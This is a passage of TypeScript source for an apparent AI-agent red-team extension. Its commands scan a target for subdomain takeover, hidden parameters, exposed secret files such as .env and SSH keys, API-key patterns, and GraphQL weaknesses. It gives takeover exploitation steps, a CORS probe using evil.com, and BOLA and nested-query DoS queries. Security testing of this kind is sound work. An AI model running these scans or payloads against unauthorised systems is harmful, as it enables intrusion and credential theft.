        echo "|-----------|-------|--------|-----------|" 
        
        for sub in $subdomains; do
          [ -z "$sub" ] && continue
          
          # Get CNAME
          cname=$(dig +short CNAME "$sub" 2>/dev/null | head -1 | sed 's/\.$//')
          
          if [ -n "$cname" ]; then
            # Check if CNAME resolves
            ip=$(dig +short A "$cname" 2>/dev/null | head -1)
            
            # Known vulnerable patterns
            vulnerable="No"
            
            # GitHub Pages
            echo "$cname" | grep -qE "github\.io$" && [ -z "$ip" ] && vulnerable="🔴 GitHub Pages"
            
            # Heroku
            echo "$cname" | grep -qE "herokuapp\.com$" && vulnerable="🟠 Check Heroku"
            
            # AWS S3
            echo "$cname" | grep -qE "s3.*amazonaws\.com$" && vulnerable="🟠 Check S3"
            
            # Shopify
            echo "$cname" | grep -qE "myshopify\.com$" && vulnerable="🟠 Check Shopify"
            
            # Azure
            echo "$cname" | grep -qE "azurewebsites\.net$|cloudapp\.azure\.com$" && vulnerable="🟠 Check Azure"
            
            # Fastly
            echo "$cname" | grep -qE "fastly\.net$" && vulnerable="🟠 Check Fastly"
            
            # Check HTTP response for dangling records
            if [ "$vulnerable" = "No" ] && [ -z "$ip" ]; then
              vulnerable="🟡 NXDOMAIN"
            fi
            
            echo "| $sub | $cname | \${ip:-NXDOMAIN} | $vulnerable |"
          fi
        done | head -50
      `, 300);

      // Also try subjack if available
      const subjack = await execCommand(`
        echo "${subdomains.output}" > /tmp/subs.txt
        subjack -w /tmp/subs.txt -t 20 -timeout 30 -ssl -c /usr/share/subjack/fingerprints.json 2>/dev/null | head -20 || echo "subjack not available"
      `, 60);

      state.toolsUsed.push("subdomain-takeover");
      state.scanResults["takeover"] = takeover.output;
      pi.appendEntry("redteam-state", state);

      ctx.ui.notify("✅ Subdomain takeover check complete.", "info");

      pi.sendUserMessage(
        `## Subdomain Takeover Analysis for ${target}

${takeover.output}

### Subjack Results
\`\`\`
${subjack.output}
\`\`\`

### Takeover Indicators:
- 🔴 **CRITICAL**: Confirmed takeover possible
- 🟠 **MEDIUM**: CNAME to claimable service
- 🟡 **LOW**: NXDOMAIN - investigate further

### Exploitation:
1. For GitHub Pages: Create repo with same name
2. For Heroku: Create app with subdomain name
3. For S3: Create bucket with same name
4. For Azure: Create resource with same name

Use \`record_finding\` for any confirmed takeovers (HIGH/CRITICAL severity).`,
        { deliverAs: "followUp" }
      );
    },
  });

  // ============================================================
  // PARAMETER FUZZING / DISCOVERY
  // ============================================================

  pi.registerCommand("params", {
    description: "🔍 Parameter Discovery - Find hidden parameters",
    handler: async (args, ctx) => {
      if (!args) {
        ctx.ui.notify("Usage: /params <target_url>", "error");
        return;
      }

      let target = args.trim();
      if (!target.startsWith("http")) target = `https://${target}`;

      ctx.ui.notify(`🔍 Discovering hidden parameters on ${target}...`, "info");

      // Use arjun if available
      const arjun = await execCommand(`arjun -u "${target}" -oT /tmp/arjun-params.txt -t 10 2>/dev/null && cat /tmp/arjun-params.txt || echo "arjun not available"`, 180);

      // Manual parameter discovery
      const manual = await execCommand(`
        common_params="id user_id userid uid email username name admin debug test callback redirect url next file path cmd exec query search q s page limit offset sort order format type action method api_key key token auth apikey secret password pass passwd"
        
        echo "| Parameter | GET | POST | Notes |"
        echo "|-----------|-----|------|-------|"
        
        for param in $common_params; do
          # Test GET
          get_resp=$(curl -s -o /dev/null -w "%{http_code}:%{size_download}" "${target}?$param=test123" --connect-timeout 3 2>/dev/null)
          get_status=$(echo "$get_resp" | cut -d: -f1)
          get_size=$(echo "$get_resp" | cut -d: -f2)
          
          # Test POST
          post_resp=$(curl -s -o /dev/null -w "%{http_code}:%{size_download}" -X POST "${target}" -d "$param=test123" --connect-timeout 3 2>/dev/null)
          post_status=$(echo "$post_resp" | cut -d: -f1)
          post_size=$(echo "$post_resp" | cut -d: -f2)
          
          # Compare with baseline (first param tested)
          notes=""
          [ "$get_status" = "200" ] && [ "$get_size" -gt 100 ] && notes="🟡 May accept"
          echo "$param" | grep -qE "debug|admin|secret|password|token" && notes="⚠️ Sensitive"
          
          echo "| $param | $get_status ($get_size) | $post_status ($post_size) | $notes |"
        done
      `, 120);

      state.toolsUsed.push("param-discovery");
      state.scanResults["params"] = arjun.output + "\n" + manual.output;
      pi.appendEntry("redteam-state", state);

      ctx.ui.notify("✅ Parameter discovery complete.", "info");

      pi.sendUserMessage(
        `## Parameter Discovery for ${target}

### Arjun Results
\`\`\`
${truncateOutput(arjun.output, 30)}
\`\`\`

### Common Parameters
${manual.output}

### Next Steps:
1. Test discovered parameters for injection vulnerabilities
2. Check \`debug\`, \`admin\`, \`test\` params for hidden functionality
3. Test \`redirect\`, \`url\`, \`callback\` for open redirect/SSRF
4. Test \`file\`, \`path\` for path traversal
5. Test \`cmd\`, \`exec\` for command injection

Use \`record_finding\` for any sensitive parameter exposure.`,
        { deliverAs: "followUp" }
      );
    },
  });

  // ============================================================
  // SECRET SCANNING
  // ============================================================

  pi.registerCommand("secrets", {
    description: "🔑 Secret Scanning - Find exposed secrets and credentials",
    handler: async (args, ctx) => {
      if (!args) {
        ctx.ui.notify("Usage: /secrets <target_url_or_domain>", "error");
        return;
      }

      const target = args.trim();
      ctx.ui.notify(`🔑 Scanning for secrets on ${target}...`, "info");

      // Scan exposed files
      const exposed = await execCommand(`
        domain="${target.replace(/^https?:\/\//, "").replace(/\/.*$/, "")}"
        base="https://$domain"
        
        echo "=== Exposed Files Check ==="
        
        sensitive_files=".env .env.local .env.production .env.development .git/config .git/HEAD .gitconfig .npmrc .dockerenv Dockerfile docker-compose.yml .aws/credentials .ssh/id_rsa id_rsa id_rsa.pub .htpasswd .htaccess web.config wp-config.php config.php settings.php database.yml secrets.yml .travis.yml .circleci/config.yml Jenkinsfile .gitlab-ci.yml package.json composer.json Gemfile requirements.txt yarn.lock package-lock.json backup.sql dump.sql database.sql db.sql .DS_Store Thumbs.db debug.log error.log access.log"
        
        for file in $sensitive_files; do
          code=$(curl -s -o /dev/null -w "%{http_code}" "$base/$file" --connect-timeout 3 2>/dev/null)
          if [ "$code" = "200" ]; then
            size=$(curl -sI "$base/$file" 2>/dev/null | grep -i content-length | cut -d: -f2 | tr -d ' \r')
            echo "🔴 FOUND: $file (HTTP 200, ${size:-unknown} bytes)"
          fi
        done
      `, 120);

      // Check JavaScript for secrets
      const jsSecrets = await execCommand(`
        domain="${target.replace(/^https?:\/\//, "").replace(/\/.*$/, "")}"
        
        echo ""
        echo "=== JavaScript Secret Patterns ==="
        
        # Download and scan main JS files
        curl -s "https://$domain" 2>/dev/null | grep -oE 'src="[^"]+\.js[^"]*"' | cut -d'"' -f2 | head -10 | while read js; do
          [[ "$js" =~ ^/ ]] && js="https://$domain$js"
          [[ ! "$js" =~ ^http ]] && continue
          
          content=$(curl -s "$js" 2>/dev/null | head -10000)
          
          # Check for API keys and secrets
          echo "$content" | grep -oE "['\"][A-Za-z0-9_-]*[Aa][Pp][Ii][_-]?[Kk][Ee][Yy]['\"]\s*[=:]\s*['\"][A-Za-z0-9_-]+['\"]" | head -3 && echo "  ↑ in $js"
          echo "$content" | grep -oE "sk_live_[A-Za-z0-9]+" && echo "  ↑ Stripe Secret Key in $js"
          echo "$content" | grep -oE "pk_live_[A-Za-z0-9]+" && echo "  ↑ Stripe Publishable Key in $js"
          echo "$content" | grep -oE "AKIA[0-9A-Z]{16}" && echo "  ↑ AWS Access Key in $js"
          echo "$content" | grep -oE "ghp_[A-Za-z0-9]{36}" && echo "  ↑ GitHub Token in $js"
          echo "$content" | grep -oE "xox[baprs]-[A-Za-z0-9-]+" && echo "  ↑ Slack Token in $js"
        done
      `, 120);

      // Try gitleaks if available
      const gitleaks = await execCommand(`
        domain="${target.replace(/^https?:\/\//, "").replace(/\/.*$/, "")}"
        mkdir -p /tmp/secrets-scan
        curl -s "https://$domain" > /tmp/secrets-scan/index.html 2>/dev/null
        gitleaks detect --source /tmp/secrets-scan -v 2>/dev/null | head -30 || echo "gitleaks not available"
      `, 60);

      state.toolsUsed.push("secret-scanning");
      state.scanResults["secrets"] = exposed.output + "\n" + jsSecrets.output;
      pi.appendEntry("redteam-state", state);

      ctx.ui.notify("✅ Secret scanning complete.", "info");

      pi.sendUserMessage(
        `## Secret Scanning Results for ${target}

### Exposed Files
\`\`\`
${exposed.output}
\`\`\`

### JavaScript Secrets
\`\`\`
${jsSecrets.output || "No secrets found in JS files"}
\`\`\`

### Gitleaks
\`\`\`
${truncateOutput(gitleaks.output, 30)}
\`\`\`

### Common Secret Patterns:
- AWS: \`AKIA[0-9A-Z]{16}\`
- Stripe: \`sk_live_\`, \`pk_live_\`
- GitHub: \`ghp_\`, \`gho_\`
- Slack: \`xox[baprs]-\`
- Google: \`AIza[0-9A-Za-z-_]{35}\`

Use \`record_finding\` for any exposed secrets (CRITICAL severity for private keys/API secrets).`,
        { deliverAs: "followUp" }
      );
    },
  });

  // ============================================================
  // GRAPHQL TESTING
  // ============================================================

  pi.registerCommand("graphql", {
    description: "📊 GraphQL Testing - Test GraphQL endpoint security",
    handler: async (args, ctx) => {
      if (!args) {
        ctx.ui.notify("Usage: /graphql <graphql_endpoint>", "error");
        return;
      }

      let target = args.trim();
      if (!target.startsWith("http")) target = `https://${target}`;

      ctx.ui.notify(`📊 Testing GraphQL endpoint ${target}...`, "info");

      // Introspection query
      const introspection = await execCommand(`
        curl -s -X POST "${target}" \
          -H "Content-Type: application/json" \
          -d '{"query":"{__schema{types{name,fields{name,args{name,type{name}}}}}}"}' \
          --connect-timeout 10 2>/dev/null | jq -r '.data.__schema.types[] | select(.fields != null) | "\(.name): \(.fields | map(.name) | join(", "))"' 2>/dev/null | head -30
      `, 30);

      // Field suggestions (error-based enumeration)
      const suggestions = await execCommand(`
        echo "=== Field Suggestions ==="
        response=$(curl -s -X POST "${target}" \
          -H "Content-Type: application/json" \
          -d '{"query":"{__typo}"}' \
          --connect-timeout 10 2>/dev/null)
        echo "$response" | jq -r '.errors[].message' 2>/dev/null | head -10
      `, 30);

      // Batching attack test
      const batching = await execCommand(`
        echo "=== Batching Test ==="
        response=$(curl -s -X POST "${target}" \
          -H "Content-Type: application/json" \
          -d '[{"query":"{__typename}"},{"query":"{__typename}"},{"query":"{__typename}"}]' \
          --connect-timeout 10 2>/dev/null)
        if echo "$response" | jq -e '.[0]' >/dev/null 2>&1; then
          echo "🟠 Batching ENABLED - potential for abuse"
          echo "$response" | jq -r '.[].data.__typename' 2>/dev/null | head -3
        else
          echo "✅ Batching not enabled or returns single response"
        fi
      `, 30);

      state.toolsUsed.push("graphql-test");
      state.scanResults["graphql"] = introspection.output + "\n" + suggestions.output + "\n" + batching.output;
      pi.appendEntry("redteam-state", state);

      ctx.ui.notify("✅ GraphQL testing complete.", "info");

      pi.sendUserMessage(
        `## GraphQL Security Testing for ${target}

### Introspection Query
\`\`\`
${introspection.output || "Introspection disabled or failed"}
\`\`\`

### Field Suggestions
\`\`\`
${suggestions.output}
\`\`\`

### Batching Test
\`\`\`
${batching.output}
\`\`\`

### GraphQL Attack Vectors:
1. **Introspection enabled**: Full schema disclosure (MEDIUM)
2. **Batching enabled**: Can bypass rate limits, brute force (MEDIUM)
3. **Nested queries**: DoS via deeply nested queries
4. **Field suggestions**: Enum types/fields even without introspection
5. **Authorization bypass**: Test accessing other users' data via ID

### Test Queries:
\`\`\`graphql
# Get all users (BOLA test)
{users{id,email,password}}

# Nested query DoS
{users{posts{comments{author{posts{comments{author}}}}}}}
\`\`\`

Use \`record_finding\` for vulnerabilities found.`,
        { deliverAs: "followUp" }
      );
    },
  });

  // ============================================================
  // LIST VARIANTS COMMAND
  // ============================================================

  pi.registerCommand("list-variants", {
    description: "📝 List generated attack variants",
    handler: async (args, ctx) => {
      if (state.attackVariants.length === 0) {
        ctx.ui.notify("No attack variants generated. Run /redteam first.", "info");
        return;
      }

      const filter = args?.trim().toLowerCase();
      let variants = state.attackVariants;

      if (filter) {
        variants = variants.filter(v => 
          v.category.includes(filter) || 
          v.name.toLowerCase().includes(filter) ||
          v.severity === filter
        );
      }

      const summary = variants.map((v, i) => 
        `${i + 1}. ${SEVERITY_EMOJI[v.severity]} [${v.severity.toUpperCase()}] ${v.name}\n   Category: ${v.category} | Automated: ${v.automated ? "✅" : "❌"} | Tests: ${v.testCases.length}`
      ).join("\n\n");

      pi.sendUserMessage(
        `## Attack Variants (${variants.length} total)\n\n${summary}\n\nUse \`list_attack_variants\` tool for full details including payloads.`,
        { deliverAs: "followUp" }
      );
    },
  });

  // ============================================================
  // TEST VARIANTS COMMAND
  // ============================================================

  pi.registerCommand("test-variants", {
    description: "🧪 Run automated tests for generated variants",
    handler: async (args, ctx) => {
      const automatedVariants = state.attackVariants.filter(v => v.automated);

      if (automatedVariants.length === 0) {
        ctx.ui.notify("No automated variants available. Run /redteam first.", "info");
        return;
      }

      ctx.ui.notify(`🧪 Running ${automatedVariants.length} automated tests...`, "info");

      const results: string[] = [];

      for (const variant of automatedVariants.slice(0, 5)) {
        ctx.ui.notify(`Testing: ${variant.name}...`, "info");

        // Run test cases based on category
        let testResult = "";
        
        if (variant.category === "cors_misconfig" && state.target) {
          const cors = await execCommand(`
            curl -sI "https://api.${state.target}" -H "Origin: https://evil.com" 2>/dev/null | grep -i access-control
          `, 10);
          testResult = cors.output.includes("evil.com") ? "🔴 CORS vulnerable!" : "✅ CORS OK";
        } else if (variant.category === "information_disclosure" && state.target) {
          const info = await execCommand(`
            for f in .env .git/HEAD robots.txt; do
              code=$(curl -s -o /dev/null -w "%{http_code}" "https://${state.target}/$f" --connect-timeout 3 2>/dev/null)
              [ "$code" = "200" ] && echo "Found: $f"
            done
          `, 30);
          testResult = info.output || "✅ No sensitive files exposed";
        } else {
          testResult = "⏭️ Manual testing required";
        }

        results.push(`### ${variant.name}\n${testResult}`);
      }

      pi.sendUserMessage(
        `## Automated Variant Test Results\n\n${results.join("\n\n")}\n\n---\n\nRemaining variants require manual testing. Use the payloads from \`list_attack_variants\`.`,
        { deliverAs: "followUp" }
      );
    },
  });
}
